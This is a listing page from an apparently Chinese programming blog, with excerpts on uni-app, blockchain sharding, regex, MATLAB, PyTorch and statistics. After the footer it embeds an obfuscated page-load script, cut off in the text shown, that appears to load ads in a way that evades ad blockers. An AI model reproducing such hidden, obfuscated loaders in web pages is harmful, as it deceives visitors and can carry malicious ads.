// plus.io.convertAbsoluteFileSystem(getApp().globalData.savepath) 这个是路径转成了本地的相当于 _doc/你的路径 plus.io.resolveLocalFileSystemURL(plus.io.convertAbsoluteFileSystem(getApp().globalData.savepath),entry =&gt; { // 有的话就不创建了 },err =&gt; { // 没有的话进行创建 这里可以拿到err里面的code值进行判断是不是没有文件夹 // url就是你要创建的文件夹目录比如 医疗/器材/针管 let url = getApp().globalData.savepath.slice(getApp().globalData.savepath.indexOf('doc/') + 4) // 在应用私有目录下进行创建 plus.io.requestFileSystem(plus.io.PRIVATE_DOC,fs =&gt; { let entry = fs.root // 拿到操作对象 // 进行创建 {create:true,exclusive:false}这个是必须写的 entry.getDirectory(url,{create:true,exclusive:false},res=&gt;{ // getApp().globalData.tempphotoObj=res; // 创建成功 },err=&gt; { console.log(err,'创建失败'); }) }) }) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a6155c5cd377c2e6240ea793abf6d06/" rel="bookmark">
			主流链分片技术和共识算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 设计到的链：Harmony、Elrond、Cosmos、ETH 2.0、Polkadot、Near Protocol
一. 主流链所用的分片技术对比 1.0 Harmony Harmony 是一个基于状态分片和 PoS 的高性能公链项目，它的分片架构由一条信标链和多条分片链组成，信标链提供包括去中心化的随机数，分片链 Header 的验证，接受验证节点的权益抵押等服务。
Harmony 怎么保证分片系统的安全性？ 为了抵抗1%攻击，Harmony 采用了 EPoS(Effective Proof-of-Stake)的有效抵押机制和安全的随机分片技术(Random Sharding)，靠协议的规定把大户抵押的代币打散成许多细小的部分，并随机分配到多个分片里，这样任何人就无法把他抵押的代币集中到单一分片内，从而无法攻击单一分片。如下所示。
Harmony 如何防止节点被贿赂？ 为了避免贿赂攻击，Harmony 引入了基于 Cuckoo Rule 的随机再分片机制（Resharding)，系统会每隔一天时间重新随机打散验证者的权利，并再分片，让攻击者很难锁定要贿赂的目标，没法成功攻击单一分片。Harmony 采用了独创的分布式随机数生成（DRG, distributed randomness generation）协议产生安全不可预测的随机数。见下图。
Harmony 如何优化跨片通信？ Harmony 采用了「Kademlia 跨片路由技术」，来控制跨片间通信的网络开销，并且利用「纠删码」对区块广播过程进行优化，使广播者的网络压力更小，避免发送者的网络瓶颈问题，从而实现高效的横向分片扩展。
1.1 Elrond Elrond是一个自适应状态分片的高吞吐量公链，提出了一种改良的权益证明机制，称之为安全权益证明（SPoS）的共识机制，引入随机选择的共识组，抵押加评级的方式。 与 Harmony 类似，Elrond 也有一条主链，称之为公证链或元链（Notarization (Meta) chain）。
Elrond 如何跨分片通信？ Elrond 执行跨分片通信的策略是使用异步模型。Elrond 的每个块结构由一个区块头表示，它包含块随机数、轮次、提议节点、验证节点时间戳等信息，以及包含交易信息的微块（Miniblock），每个微块都包含所有事务。 在这个网络中，交易的验证和执行会先在发送方的分片中完成，然后在元链中进行公证并提供执行证明，之后再到接收方的分片中完成并更新余额等。
Elrond 如何保证跨分片通信时数据安全？ Elrond 使用了随机数来保证安全性，例如将区块提议者和验证者随机采样到共识组中，并在一个轮次结束后对分片之间的节点进行改组。
1.2 Cosmos Cosmos 如何跨链交易？ Cosmos的区块链间通信协议（IBC）将不同区块链连接起来，达到价值（cosmos只能跨链传递币而不能传递其他信息）转移的目的。依赖节点对 relayer的信任。
Cosmos 如何保证链间交易数据安全？ Cosmos 没有解决分区安全性的问题，或者说 Cosmos 避开了安全性的问题，一旦某个分区被恶意节点攻陷，该分区可以任意向 Hub 提交伪造的交易，而 Cosmos Hub 不会去验证交易本身的合法性，是否信任该分区则完全是其他分区或者用户决定的，也就是说最终的安全性仅由该分区的验证者节点负责。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a6155c5cd377c2e6240ea793abf6d06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0772b50268d1df14182f55feadcff01b/" rel="bookmark">
			排查内存泄露
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Arthas Install | arthas
1、下载阿里云的Arthas
2、按照上面的连接，生成dump文件
3、下载MAT分析工具
看什么地方内存使用最多，然后点击2大图表分析
最后找到这个类有问题，需要优化
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/262aee77b444394e4e05ce5da25b0be5/" rel="bookmark">
			OPENCV多种模板匹配使用对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前文简单提到模板匹配中的一种：NCC多角度模板匹配，博主结合实际的检测项目（已落地）发现其准确率和稳定性有待提升，特别是一些复杂背景的图形，又或是模板选取不当都会造成不理想的效果；同时也借鉴过基于梯度变化的匹配策略，但要说落实到实际项目上去总是差强人意（可能也是鄙人技术不够，哈哈）；所以博主今天分享另外两种比较适用的匹配方式！
1). 当图像中存在完整且容易提取的外形轮廓时，shapematch形状匹配不失为一种简单快捷的方法，不需要额外去按照固定角度旋转图像来搜索图像，亦不需要担心模板图像旋转后的留白区域影响匹配得分，按照固定的模式来操作即可：
使用Opencv已有方法MatchShapes进行匹配即可，不过匹配后的重心和角度 需要做进一步处理，重心计算公式：
//获取重心点	Moments M = Cv2.Moments(bestcontour); double cX = (M.M10 / M.M00); double cY = (M.M01 / M.M00); 角度计算公式：
//-90~90度 //由于先验目标最小包围矩形是长方形 //因此最小包围矩形的中心和重心的向量夹角为旋转 RotatedRect rect_template = Cv2.MinAreaRect(imgTemplatecontours); RotatedRect rect_search = Cv2.MinAreaRect(bestcontour); //两个旋转矩阵是否同向 float sign = (rect_template.Size.Width - rect_template.Size.Height) * (rect_search.Size.Width - rect_search.Size.Height); float angle=0; if (sign &gt; 0) // 可以直接相减 angle = rect_search.Angle - rect_template.Angle; else angle = (90 + rect_search.Angle) - rect_template.Angle; if (angle &gt; 90) angle -= 180; 测试效果如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/262aee77b444394e4e05ce5da25b0be5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f9d45af32affec55a0dcac019aec92e/" rel="bookmark">
			keil如何查看变量的实时值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		局部变量在全速运行过程中观察不到，只有程序暂停时才能看到局部变量值。
想要在全速运行时就能看到局部变量值的变化有两种方法。
方法一：将局部变量声明为volatile类型
如下图：vu16类型 就是volatile unsigned short int类型。
方法二：将局部变量改为全局变量，这样全速运行时也能看到变量值变化。
如下图，可以看到变量i j k在main()函数外面。
进入仿真之后，要选择view菜单下的 periodic window update，然后点击全速运行，也可以看到变量的值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b52a65f0e17649a69fa2fa863159337/" rel="bookmark">
			常用的matlab函数命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		常用的matlab函数命令 1 查看程序运行时间2 查看字符串是否内容和长度是否一致，并返回逻辑值3 把两种算法整合到一起4 添加搜索路径5 切换路径6 三维矩阵的生成7 三维矩阵的转换8 只计算矩阵X'X的对角元9 exist函数的使用10 isfield函数的使用11 fprintf函数的使用12 非线性函数求根函数fzero13 向量与矩阵的点乘14 两个矩阵乘积的迹15 对角矩阵乘以普通矩阵16 matlab中实现打印矩阵17 matlab中实现查看电脑的cpu核数18 matlab 标注特殊点18 两条线画在一个figure上19 画水平线或者垂直线20 因子旋转21 matlab设置默认参数的方法使用可变输入参数varargin使用参数nargin使用nargin和isempty命令 22 三维数组转化为cell格式23 matlab生成的单张图片裁剪空白的方法24 matlab生成的多张图片裁剪空白的方法25 matlab打印向量26 matlab在一个向量中删除其中一个子向量的两种方法：分别使用ismember和setdiff函数。27 给定张量数据每个mode的最大因子数量，生成该mode的所有候选因子模型28 给定张量数据每个mode的候选因子模型的集合，生成张量数据的所有候选模型29 生成给定的多个向量的笛卡尔积 1 查看程序运行时间 % method 1 tic toc % method 2 profile on profile viewer % method 3 t1 = clock; t2 = clock; t = etime(t2,t1) % method 4 t1 = cputime; t = cputime - t1; 2 查看字符串是否内容和长度是否一致，并返回逻辑值 strcmp('AECM','AECM'); %返回逻辑值，0或者1 strcmpi(s1,s2); %此 MATLAB 函数 将比较 s1 和 s2，并忽略字母大小写差异。如果二者相同，函数将返回 1 (true)，否则返回 0 (false)。如果文本的大小和内容相同，则它们将视为相等，不考虑大小写。返回结果 tf 的数据类型为 logical。 3 把两种算法整合到一起 switch alg % alg 代表算法的名字如CM,AECM case 'CM' % 如果alg='CM'，执行本段代码 case 'AECM' % 如果alg='AECM'，执行本段代码 4 添加搜索路径 addpath 5 切换路径 cd('.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b52a65f0e17649a69fa2fa863159337/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed5ab1d2540c1844f5f983f82a0aa078/" rel="bookmark">
			Spring Cloud Alibaba Spring Cloud Spring Boot 版本对应关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		版本不对应可能有以下报错： Failed to bind properties under mybatis-plus.configuration.result-maps[0]
NoClassDefFoundError: reactor/netty/http/server/WebsocketServerSpec$Builder
reactor.netty.resources.ConnectionProvider.elastic(Ljava/lang/String;Ljava/time/Duration;)Lreactor/netty/resources/ConnectionProvider
毕业版本依赖关系(推荐使用) 由于 Spring Boot 2.4+ 和以下版本之间变化较大，目前企业级客户老项目相关 Spring Boot 版本仍停留在 Spring Boot 2.4 以下，为了同时满足存量用户和新用户不同需求，社区以 Spring Boot 2.4 为分界线，同时维护 2.2.x 和 2021.x 两个分支迭代。
2021.x 分支 适配 Spring Boot 2.4，Spring Cloud 2021.x 版本及以上的 Spring Cloud Alibaba 版本按从新到旧排列如下表（最新版本用*标记）： (注意，该分支 Spring Cloud Alibaba 版本命名方式进行了调整，未来将对应 Spring Cloud 版本，前三位为 Spring Cloud 版本，最后一位为扩展版本，比如适配 Spring Cloud 2021.0.1 版本对应的 Spring Cloud Alibaba 第一个版本为：2021.0.1.0，第个二版本为：2021.0.1.1，依此类推)
Spring Cloud Alibaba VersionSpring Cloud VersionSpring Boot Version 2021.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed5ab1d2540c1844f5f983f82a0aa078/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6df9b2533278ead6e39276d5587fde2a/" rel="bookmark">
			Java Pattern和Matcher用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java正则表达式通过java.util.regex包下的Pattern和Matcher类实现
Pattern用法 Pattern类用于创建一个正则表达式，也可以说是创建一个匹配模式
//1. Pattern.compile() Pattern pattern = Pattern.compile("Java"); // 返回此模式的正则表达式即Java System.out.println(pattern.pattern()); //2. Pattern.split() String test="123Java456Java789Java"; String[] result = pattern.split(test); for(String s : result) System.out.println(s); //结果： //123 //456 //789 //3. Pattern.matche()方法 String test1 = "Java"; String test2 = "Java123456"; System.out.println(Pattern.matches("Java",test1));//返回true System.out.println(Pattern.matches("Java",test2));//返回false Matcher类用法# Pattern类中的matcher(CharSequence input)会返回一个Matcher对象。Matcher类提供了对正则表达式的分组支持,以及对正则表达式的多次匹配支持，要想得到更丰富的正则匹配操作,那就需要将Pattern与Matcher联合使用。
Matcher类提供了三个返回boolean值得匹配方法：matches()，lookingAt()，find()，find(int start)，其中matches()用于全字符串匹配，lookingAt从字符串最开头开始匹配满足的子串，find可以对任意位置字符串匹配,其中start为起始查找索引值。
Pattern pattern = Pattern.compile("Java"); String test1 = "Java"; String test2 = "Java1234"; String test3 = "1234Java" //1. match方法需要整个字符串都匹配正则才返回true //1）返回true Matcher matcher = pattern.matcher(test1); System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6df9b2533278ead6e39276d5587fde2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9be6ac7ba87611e26b66f68fdb23f22a/" rel="bookmark">
			Python：对程序做性能分析及计时统计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.对整个程序的性能分析 如果只是想简单地对整个程序做计算统计，通常使用UNIX下的time命令就足够了。
(base) ➜ Learn-Python time python someprogram.py python someprogram.py 0.10s user 0.01s system 98% cpu 0.117 total 由于我用的是Mac系统，和Linux系统的输出可能有不同，不过关键都是这三个时间：
user: 运行用户态代码所花费的时间，也即CPU实际用于执行该进程的时间，其他进程和进程阻塞的时间不计入此数字。
system: 在内核中执行系统调用（如I/O调用）所花费的CPU时间。
total(Linux下应该是real):即挂钟时间(wall-clock time)，也称响应时间(response time)、消逝时间(elapsed time)，是进程运行开始到结束所有经过的时间，包括了进程使用的时间片和进程阻塞的时间（例如等待I/O完成）。
请注意，若user + system &gt; total，可能存在多个处理器并行工作；
若user + system &lt; total，则可能在等待磁盘、网络或其它设备的响应。
也就说上面这个程序的挂钟时间为0.251s，CPU实际用于执行该进程的时间为0.24s，用于系统调用的时间为0.01s。
再来看看另外一个极端，如果想针对程序的行为产生一份详细的报告，那么可以使用cProfile模块：
(base) ➜ Learn-Python python -m cProfile someprogram.py 7 function calls in 0.071 seconds Ordered by: standard name ncalls tottime percall cumtime percall filename:lineno(function) 1 0.002 0.002 0.071 0.071 someprogram.py:1(&lt;module&gt;) 1 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9be6ac7ba87611e26b66f68fdb23f22a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ca736e2c30438284f0adf3cc10b21ff/" rel="bookmark">
			卷积神经网络中的分类与回归
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 数据增强卷积神经网络的发展LeNetAlexNetVGGNetReseNet 分类网络的实现模型训练损失函数优化器学习率训练与验证 模型展示多标签分类验证码生成模型搭建模型训练验证码识别 数据增强 数据增强是一种在训练模型过程中用于提高样本多样性，增强模型泛化能力的手段。在对图像进行数据增强时，必须保留图像中与标签对应的关键信息。使用了两种数据增强手段：随机裁剪和随机翻转。其中随机裁剪是先在图片外围补存4个像素，然后在图片中随机裁剪32×32图片的方法：随机翻转是按一定概率选择是否对图片进行翻转处理的方法。这两种手段都不会改变图片原有的信息（随机裁剪后保留的信息占原图的比例足够大，所以信息会得以保留）。
#coding=utf-8 import cv2 import torch import torch.nn as nn import torch.optim as optim import torch.nn.functional as F from torchvision import datasets, transforms import matplotlib.pyplot as plt import numpy as np from PIL import Image from sklearn.datasets import make_blobs from torchvision.models import resnet18 from torchvision import transforms from PIL import Image #定义设备 device=( torch.device("cuda") if torch.cuda.is_available() else torch.device("cpu") ) #数据目录 data_folder="/data/cifar10" #模型存储目录 checkpoint_folder="/data/chapter_one" #每一个批次图片的数量 batch_size=64 #随着训练的次数增加，逐步缩小学习率 epochs=[(30,0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ca736e2c30438284f0adf3cc10b21ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/842cb465be84547a183ec5a2cee6480e/" rel="bookmark">
			项目使用smart-doc&#43;Torna自动化创建api文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先部署Torna，我这里是用docker部署的
准备工作：1 docker 环境
2 torna 所需的sql脚本（可以去github 找最新的）
DROP TABLE IF EXISTS `compose_additional_page`; CREATE TABLE IF NOT EXISTS `compose_additional_page` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `project_id` bigint(20) unsigned NOT NULL COMMENT 'compose_project.id', `title` varchar(64) NOT NULL COMMENT '文档标题', `content` text COMMENT '文档内容', `order_index` int(11) NOT NULL DEFAULT '0' COMMENT '排序值', `status` tinyint(4) NOT NULL DEFAULT '1' COMMENT '1:启用，0：禁用', `is_deleted` tinyint(4) NOT NULL DEFAULT '0', `gmt_create` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP, `gmt_modified` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`) USING BTREE, KEY `idx_projectid` (`project_id`) USING BTREE ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 ROW_FORMAT=DYNAMIC COMMENT='聚合文档附加页'; -- 正在导出表 torna.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/842cb465be84547a183ec5a2cee6480e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1418190f6f5abe00e8d14a3bd8e4b66e/" rel="bookmark">
			广义线性混合模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GLM一般是指 generalized linear model ，也就是广义线性模型；而非 general linear model，也就是一般线性模型；而GLMM （generalized linear mixed model）是广义线性混合模型。
广义线性模型GLM很简单，举个例子，药物的疗效和服用药物的剂量有关。这个相关性可能是多种多样的，可能是简单线性关系（发烧时吃一片药退烧0.1度，两片药退烧0.2度，以此类推；这种情况就是一般线性模型），也可能是比较复杂的其他关系，如指数关系（一片药退烧0.1度，两片药退烧0.4度），对数关系等等。这些复杂的关系一般都可以通过一系列数学变换变成线性关系，以此统称为广义线性模型。
广义线性混合模型GLMM比较复杂，GLM要求观测值误差是随机的，而GLMM则要求误差值并非随机，而是呈一定分布的。举个例子，我们认为疗效可能与服药时间相关，但是这个相关并不是简简单单的疗效随着服药时间的变化而改变。更可能的是疗效的随机波动的程度与服药时间有关。比如说，在早上10：00的时候，所有人基本上都处于半饱状态，此时吃药，相同剂量药物效果都差不多。但在中午的时候，有的人还没吃饭， 有的人吃过饭了，有的人喝了酒，结果酒精和药物起了反应，有的人喝了醋，醋又和药物起了另一种反应。显然，中午吃药会导致药物疗效的随机误差非常大。这种疗效的随机误差（而非疗效本身）随着时间的变化而变化，并呈一定分布的情况，必须用广义线性混合模型了。
广义线性混合模型GLMM（Generalized Linear Mixed Model），是广义线性模型GLM 和线性混淆模型LMM 的扩展形式，于二十世纪九十年代被提出。GLMM因其借鉴了混合模型的思想，其在处理纵向数据（重复测量资料）时，被认为具有独特的优势。GLMM不仅擅长处理重复测量资料，还可以用于任何层次结构的数据（因为本质上又是多水平模型）。
广义线性混合模型GLMM，可以看做是线性混合模型LMM的扩展形式，使得因变量不再要求满足正态分布；也可以看作是GLM的扩展形式，使得可以同时包含固定效应和随机效应。
使用GLMM的软件包
R语言中的nlme：lme()应用于线性混合模型，nlme()应用于非线性混合模型。可以定义复杂的方差结构，不支持广义线性混合模型（GLMM）,对于镶嵌结构（nested）的随机因子定义简单，但对于交叉的随机因子（crossed）定义困难；
R语言中的lme4：nlme的进一步扩展，支持GLMM，很难处理交叉的随机因子，运行速度要快于nlme；
R语言中的MCMCglmm：用马尔可夫链蒙特卡罗(Markov Chain Monte Carlo，MCMC)的方法拟合模型，贝叶斯先验分布，可以定义一些复杂的方差结构（heterogeneous yes， AR1 no）；
SAS中的PROC GLIMMIX模块支持了Laplace approximation和adaptive Gaussian quadrature方法，但对于复杂的模型，用的还是PQL方法；
SAS中的PROC MIXED模块执行一般线性混合模型（LMM）；
ASReml
ASReml-R包：是ASReml软件的R版本，运算速度快，支持复杂的模型（随机因子的定义G矩阵和残差矩阵的定义R矩阵），支持系谱信息和多性状分析，在动物、作物、林木、水产育种和科研中应用广发。
GenStat软件的GLMM模型
Packages For now, this page is only covering "basic" mixed modeling packages (although the line is admittedly somewhat blurry): see the list of packages on the main page for packages covering additive mixed models, Cox regression, etc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1418190f6f5abe00e8d14a3bd8e4b66e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66359bd7c545fdbacefcea7be93ed313/" rel="bookmark">
			R语言主成分分析可视化(颜值高，很详细)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 PCA特征值可视化提取变量结果变量结果可视化变量和主成分的cos2可视化变量对主成分的贡献可视化 Dimension description提取样本结果样本结果可视化样本的cos2可视化样本对主成分的贡献可视化 biplot参考资料 网络上很多R语言教程都是基于R语言实战进行修改，今天为大家介绍更好用的R包，在之前聚类分析中也经常用到：factoextra和factoMineR，关于主成分分析的可视化，大家比较常见的可能是ggbiplot，这几个R包都挺不错，大家可以比较下。
之前已经多次用到了这两个R包：
PCA聚类 这两个R包的函数可以直接使用prcomp()函数的结果，也可以使用FactoMineR的PCA()函数进行，结果更加详细。
PCA 使用R语言自带的iris鸢尾花数据进行演示。
rm(list = ls()) library(factoextra) ## Loading required package: ggplot2 ## Welcome! Want to learn more? See two factoextra-related books at https://goo.gl/ve3WBa library(FactoMineR) pca.res &lt;- PCA(iris[,-5], graph = F, scale.unit = T) # 简简单单1行代码实现主成分分析 pca.res ## **Results for the Principal Component Analysis (PCA)** ## The analysis was performed on 150 individuals, described by 4 variables ## *The results are available in the following objects: ## ## name description ## 1 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/66359bd7c545fdbacefcea7be93ed313/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b2fb3cb047617fe6827e979a8d7f506/" rel="bookmark">
			解决：pytorch同时让两个dataloader打乱的顺序是相同
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		class SamplerDef(object): def __init__(self, data_source, indices): self.data_source = data_source self.indices = indices def __iter__(self): return iter(self.indices) def __len__(self): return len(self.data_source) n = len(dataset_train1) indices = torch.randperm(n) mySampler = SamplerDef(data_source=dataset_train1, indices=indices) ITS_train_loader1 = torch.utils.data.DataLoader(dataset_train1, batch_size=BATCH_SIZE, shuffle=False,pin_memory=True, sampler=mySampler) ITS_train_loader2 = torch.utils.data.DataLoader(dataset_train2, batch_size=BATCH_SIZE, shuffle=False,pin_memory=True, sampler=mySampler) 解决了可以同步的问题，但是每次获取的样本都一样，不满足要求，想将两个数据集的打乱读，而且还要同步，每次还不一样。
解决：
class MyDataset(Dataset): def __init__(self, datasetA, datasetB): self.datasetA = datasetA self.datasetB = datasetB def __getitem__(self, index): xA = self.datasetA[index] xB = self.datasetB[index] return xA, xB def __len__(self): return len(self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b2fb3cb047617fe6827e979a8d7f506/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/203/">«</a>
	<span class="pagination__item pagination__item--current">204/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/205/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,